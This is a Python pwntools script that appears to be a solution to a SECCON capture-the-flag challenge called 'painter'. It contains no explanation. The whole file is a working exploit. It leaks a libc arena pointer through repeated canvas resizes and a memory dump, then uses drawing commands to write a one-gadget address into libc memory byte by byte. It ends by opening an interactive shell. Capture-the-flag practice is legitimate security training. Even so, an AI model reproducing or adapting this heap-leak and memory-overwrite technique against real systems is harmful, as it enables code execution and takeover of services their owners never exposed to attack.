from pwn import *
import os

HOST, PORT = 'painter.pwn.seccon.jp', 1337

ii = lambda *args: map(lambda x: r.sendline(str(x)), args)
system = 0x45390

def cmd(x, verbose=False):
	print x
	ii(x)
	d = r.recvuntil(x.split(' ')[0] + ' success!\n')
	if verbose:
		print d

def dump():
	ii('dump')
	return r.recvuntil('dump success!\n', drop=True)

# pause()
# width, height: non-fastbin size
width = 32
r = remote(HOST, PORT)
ii('%d %d' % (0x20, 0x10))
cmd('color #414141')
pause()
if True:
	# width, height: fastbin size
	cmd('resize %d %d' % (width, 2))
	pause()
	# width, height: not-0x40 size
	cmd('resize %d %d' % (width, 2))
	cmd('resize %d %d' % (width, 15))
	data = dump()
	print hexdump(data)

	arena = u64(data[0x510:][:8])
	print hex(arena)

randfloat = lambda: abs(struct.unpack("<f", os.urandom(4))[0]+1)

width, height = 4096, 512
cmd('resize %d %d' % (width, height))
def overwrite(color):
	cmd('color ' + color)
	cmd('line 988 1 0.000000 0.000000 10')

overwrite('#FFFFFF')
target = width * height * 3 + 0x1000 - 0x18
target += 0x3ed8e8
targetX = target / 3 % 4096
targetY = target / 3 / 4096
color = arena-0x3ec0e0
print hex(color)
gadget=system
gadget=0x10a38c
color = color + gadget
color <<= (target % 3) * 8
rgb = lambda color: '%02x%02x%02x' % (color & 0xff, (color >> 8) & 0xff, (color >> 16))
targetX -= 1
for i in range(4):
	pause()

	cmd('color #%s' % rgb(color & 0xffffff))
	cmd('rectangle %d %d %d %d' % (targetX, targetY, targetX + 1, targetY + 1))
	targetX += 1
	color >>= 24

overwrite('#000000')
ii('resize 0 0')
r.interactive()
